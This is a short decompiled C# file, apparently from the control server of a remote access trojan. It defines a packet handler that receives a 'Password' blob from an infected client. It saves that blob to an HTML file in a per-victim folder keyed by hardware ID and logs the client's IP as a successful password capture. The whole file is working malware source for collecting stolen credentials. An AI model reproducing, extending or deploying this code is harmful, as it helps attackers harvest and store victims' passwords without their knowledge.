using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000058 RID: 88
	public class AllInOne
	{
		// Token: 0x060002D3 RID: 723 RVA: 0x0001DFE0 File Offset: 0x0001C1E0
		public AllInOne(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				string text = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "AllInOne");
				string asString = unpack_msgpack.ForcePathObject("Password").AsString;
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				File.WriteAllText(text + "\\AllInOne_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".html", asString.Replace("\n", Environment.NewLine));
				new HandleLogs().Addmsg(string.Concat(new string[]
				{
					"Client ",
					client.Ip,
					" AllInOne-Password was saved successfully @ ClientsFolder \\ ",
					unpack_msgpack.ForcePathObject("Hwid").AsString,
					" \\ AllInOne"
				}), Color.Purple);
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg(ex.Message, Color.Red);
			}
		}
	}
}
